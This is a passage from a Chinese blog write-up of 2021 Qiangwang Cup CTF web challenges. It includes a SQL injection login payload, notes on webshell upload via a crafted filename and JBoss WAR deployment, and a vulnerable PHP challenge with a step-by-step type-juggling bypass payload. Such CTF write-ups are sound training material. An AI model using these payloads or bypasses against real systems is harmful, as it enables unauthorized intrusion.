double-quoted-string\">\"5/31/2021, 9:10:29 PM\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"path\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"1c60db40f1f992ff1b8243c1e24dd149\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"exp.py\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"date\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"5/31/2021, 9:11:27 PM\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string double-quoted-string\">\"id\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"path\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"da2574de5ac23b656882772a625ba310\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"www.zip\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"date\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"5/31/2021, 9:12:44 PM\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615011146299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p>我蠢蠢的拼接路径，还是无法打开。大概猜测后续需要进一步获取这些敏感文件，但如何获取可能需要提权或其他渗透手段。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615011912400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <blockquote> \n  <p>下面开始参考Nu1L大神们的WP。哎，自己还是太菜了，哈哈 ^O(∩_∩)O</p> \n </blockquote> \n <p><strong>第三步，我们尝试打开hint目录，可以看到提示去服务器获取文件的信息。</strong></p> \n <ul>\n  <li><mark>http://47.104.137.239/hint</mark></li>\n </ul> \n <pre><code class=\"prism language-php\"><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"# hint ^_^\\n\\tSo~ How to get files in this server?\n\\n\\tfiles/????????????????????????????????\"</span><span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>第四步，他们扫描发现了后台登录页面，网址如下：</strong></p> \n <ul>\n  <li><mark>http://47.104.137.239:36842/account/login</mark></li>\n  <li>怎么扫描这个IP地址和目录的呢？</li>\n </ul> \n <pre><code class=\"prism language-php\"><span class=\"token keyword\">Try</span> to scan <span class=\"token number\">35000</span><span class=\"token operator\">-</span><span class=\"token number\">40000</span> <span class=\"token operator\">^</span><span class=\"token constant\">_</span><span class=\"token operator\">^</span><span class=\"token operator\">.</span>\nAll tables are <span class=\"token keyword\">empty</span> except <span class=\"token keyword\">for</span> the table where the username <span class=\"token keyword\">and</span> password\nare located\n<span class=\"token argument-name\">Table</span><span class=\"token punctuation\">:</span> employ\n</code></pre> \n <p><strong>第五步，发现后台登录存在注入，直接进入后台，使用注入语句如下。</strong></p> \n <ul>\n  <li>只恨网站关闭不能复现，泪奔 ~~o(&gt;_&lt;)o ~~</li>\n </ul> \n <pre><code class=\"prism language-php\">\' union select <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token operator\">--</span> a\n</code></pre> \n <p><strong>第六步，扫描发现存在 file 路由文件上传，经过测试发现文件采用无字符webshell，文件名为 <code>1.p&lt;h&lt;p</code>，即可上传shell。</strong></p> \n <p><strong>第七步， jboss 部署 war 包拿 flag。</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615013209120.png#pic_center\" alt=\"在这里插入图片描述\" width=\"300\" height=\"250\"></p> \n <blockquote> \n  <p>都是什么神仙操作，有时候看着只差一步，但差之千里，功夫还太浅。<br> 加油吧！少年，多向这些大佬学习。</p> \n </blockquote> \n <hr> \n <h1><a id=\"_134\"></a>二.[强网先锋]寻宝</h1> \n <h2><a id=\"1_135\"></a>1.题目描述</h2> \n <p>题目描述如下：</p> \n <ul>\n  <li>共304支队伍攻克，最后分值31pt</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/2021061501325745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"400\" height=\"280\"></p> \n <p>该网站打开如下图所示：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615013348252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p>该题目WP参考joker-yan大佬的解题思路，在此感谢，CSDN博友的可以关注他一波。</p> \n <ul>\n  <li><a href=\"https://blog.csdn.net/weixin_46245411/article/details/117898565\">https://blog.csdn.net/weixin_46245411/article/details/117898565</a></li>\n </ul> \n <h2><a id=\"2_153\"></a>2.解题思路</h2> \n <p>该网站包括两个输入框，需要你输入Key1和Key2然后解密。通过信息1和信息2分别获取两段Key值。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615013610846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p><strong>第一步，分别下载线索1和线索2。</strong></p> \n <ul>\n  <li>线索1为source1.php，代码审计</li>\n  <li>线索2为docx压缩包，需要编写脚本自动遍历。</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615013741827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/2021061501374783.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"350\"></p> \n <p><strong>第二步，分析source1.php源代码，通过bypass获取结果。</strong></p> \n <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">\'Content-type:text/html;charset=utf-8\'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$string</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token variable\">$filter_word</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">\'php\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'flag\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'index\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'KeY1lhv\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'source\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'key\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'eval\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'echo\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\\$\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\\(\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\\.\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'num\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'html\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\\/\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\\,\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\\\'\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'0000000\'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$filter_phrase</span><span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">\'/\'</span><span class=\"token operator\">.</span><span class=\"token function\">implode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">\'|\'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$filter_word</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">\'/\'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filter_phrase</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">\'\'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$string</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number1\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number2\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'nunber3\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number4\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">\'1\'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number5\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">\'1\'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$num1</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number1\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n<span class=\"token variable\">$num2</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number2\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n<span class=\"token variable\">$num3</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number3\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n<span class=\"token variable\">$num4</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number4\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$num5</span> <span class=\"token operator\">=</span> <span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ppp</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">\'number5\'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    \n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"非数字\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n  \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num1</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"第一层\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num2</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">500000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"第二层\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token string single-quoted-string\">\'4bf21cd\'</span> <span class=\"token operator\">===</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"第三层\"</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num4</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num4</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num4</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num4</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"第四层\"</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token function\">json_decode</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$num5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">===</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$y</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"第五层\"</span><span class=\"token punctuation\">;</span>\n                                    <span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">\'KeY1lhv.php\'</span><span class=\"token punctuation\">;</span>\n                                    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$KEY1</span><span class=\"token punctuation\">;</span>\n                                <span class=\"token punctuation\">}</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no111\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n非数字\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre> \n <p>核心bypass代码如下：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615014701193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"650\" height=\"200\"></p> \n <p><strong>第三步，尝试在本地搭建环境进行bypass五层绕过。</strong></p> \n <ul>\n  <li><mark>第一层：要求非纯数字且大于1024，利用PHP的格式转换（字符串比较读取）$num1=11111a即可。</mark></li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615015453473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"450\"></p> \n <ul>\n  <li><mark>第二层：绕过intval函数，利用科学技术法绕过长度小于5。</mark></li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615015608972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"450\"></p> \n <ul>\n  <li><mark>第三层：substr(md5)取值为某个值，利用脚本运行md5，计算出num3为61823470。</mark></li>\n </ul> \n <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n	<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token number\">60000000</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$a</span><span class=\"token operator\">&lt;</span><span class=\"token number\">70000000</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$a</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n	<span class=\"token punctuation\">{\n    <!-- --></span>\n		<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">\'4bf21cd\'</span><span class=\"token punctuation\">)</span>	\n		<span class=\"token punctuation\">{\n    <!-- --></span>\n			<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n		<span class=\"token punctuation\">}</span>\n	<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615015942351.png#pic_center\" alt=\"在这里插入图片描述\" width=\"500\" height=\"150\"></p> \n <ul>\n  <li><mark>第四层：科学计数法绕过，长度为7且为0，num4为0e00000。</mark></li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615020339326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"450\"></p> \n <ul>\n  <li><mark>第五层：JSON格式的字符串为空，json_decode在解析非json格式的时候会自动置空NULL，所以很容易绕过，比如num5为a即可。</mark></li>\n </ul> \n <p><strong>第四步，最终构造的Payload能绕过source1.php。</strong></p> \n <pre><code class=\"prism language-php\">ppp<span class=\"token punctuation\">[</span>number1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">11111</span>a<span class=\"token operator\">&amp;&amp;</span>ppp<span class=\"token punctuation\">[</span>number2<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">3.0e6</span><span class=\"token operator\">&amp;</span>ppp<span class=\"token punctuation\">[</span>number3<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">61823470</span><span class=\"token operator\">&amp;</span>\nppp<span class=\"token punctuation\">[</span>number4<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">0e00000</span><span class=\"token operator\">&amp;</span>ppp<span class=\"token punctuation\">[</span>number5<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>eastmount\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615020838538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Vhc3Rtb3VudA==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\" width=\"600\" height=\"450\"></p> \n <p>此时，我们得到Key1。</p> \n <ul>\n  <li><mark>KEY1{e1e1d3d40573127e9ee0480caf1283d6}</mark></li>\n </ul> \n <p><strong>第五步，注意下载该压缩包总失败，我们可以随意使用⼀个支持自动分片下载的下载工具即可，如迅雷。解压后发现是一对docx文件，编写一个Python脚本遍历搜索“KEY2”即可。</strong></p> \n <p>方法很多，比如LU神的代码。</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615021753883.png#pic_center\" alt=\"在这里插入图片描述\" width=\"360\" height=\"460\"></p> \n <p>再如Nu1L大神的代码。</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> glob\n<span class=\"token keyword\">import</span> zipfile\n<span class=\"token keyword\">import</span> tqdm\n<span class=\"token keyword\">from</span> xml<span class=\"token punctuation\">.</span>etree<span class=\"token punctuation\">.</span>cElementTree <span class=\"token keyword\">import</span> XML\n\nWORD_NAMESPACE <span class=\"token operator\">=</span> <span class=\"token string\">\'{http://schemas.openxmlformats.org/wordprocessingml/2006/main}\'</span>\nPARA <span class=\"token operator\">=</span> WORD_NAMESPACE <span class=\"token operator\">+</span> <span class=\"token string\">\'p\'</span>\nTEXT <span class=\"token operator\">=</span> WORD_NAMESPACE <span class=\"token operator\">+</span> <span class=\"token string\">\'t\'</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_docx_text</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n	document <span class=\"token operator\">=</span> zipfile<span class=\"token punctuation\">.</span>ZipFile<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n	xml_content <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token 